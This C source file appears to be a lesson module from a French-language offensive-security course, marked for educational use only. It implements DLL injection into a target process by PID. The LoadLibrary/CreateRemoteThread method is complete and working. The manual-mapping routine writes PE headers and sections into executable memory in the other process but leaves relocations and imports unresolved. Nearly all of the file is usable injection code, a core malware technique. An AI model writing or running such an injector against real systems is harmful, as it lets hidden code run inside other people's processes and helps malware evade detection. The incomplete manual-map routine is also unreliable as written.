/*
 * ⚠️ AVERTISSEMENT STRICT - Usage éducatif uniquement
 * Module 25 : DLL Injection
 */

#include <windows.h>
#include <stdio.h>

// 1. Classic LoadLibrary injection
BOOL inject_loadlibrary(DWORD pid, const char* dll_path) {
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return FALSE;

    SIZE_T path_len = strlen(dll_path) + 1;
    LPVOID mem = VirtualAllocEx(hProc, NULL, path_len, MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProc, mem, dll_path, path_len, NULL);

    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC loadlib = GetProcAddress(kernel32, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)loadlib,
                                       mem, 0, NULL);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        printf("[+] LoadLibrary injection successful\n");
    }

    VirtualFreeEx(hProc, mem, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return hThread != NULL;
}

// 2. Manual Mapping (simplified)
BOOL manual_map(DWORD pid, const char* dll_path) {
    // Charger DLL localement
    HANDLE hFile = CreateFileA(dll_path, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, 0, NULL);
    DWORD file_size = GetFileSize(hFile, NULL);
    LPVOID local_image = VirtualAlloc(NULL, file_size, MEM_COMMIT, PAGE_READWRITE);
    
    ReadFile(hFile, local_image, file_size, NULL, NULL);
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)local_image;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)local_image + dos->e_lfanew);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allouer dans cible
    LPVOID remote_image = VirtualAllocEx(hProc, NULL,
                                        nt->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);

    // Écrire headers
    WriteProcessMemory(hProc, remote_image, local_image,
                      nt->OptionalHeader.SizeOfHeaders, NULL);

    // Écrire sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(hProc,
                          (BYTE*)remote_image + section[i].VirtualAddress,
                          (BYTE*)local_image + section[i].PointerToRawData,
                          section[i].SizeOfRawData, NULL);
    }

    // Note : Relocations et imports à fixer ici (code complexe)
    // Voir solution.txt pour implémentation complète

    printf("[+] Manual mapping done at %p\n", remote_image);

    VirtualFree(local_image, 0, MEM_RELEASE);
    CloseHandle(hProc);
    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: %s <method> <pid> <dll_path>\n", argv[0]);
        printf("Methods: 1=LoadLibrary, 2=ManualMap\n");
        return 1;
    }

    int method = atoi(argv[1]);
    DWORD pid = atoi(argv[2]);
    const char* dll_path = argv[3];

    switch(method) {
        case 1: inject_loadlibrary(pid, dll_path); break;
        case 2: manual_map(pid, dll_path); break;
    }

    return 0;
}
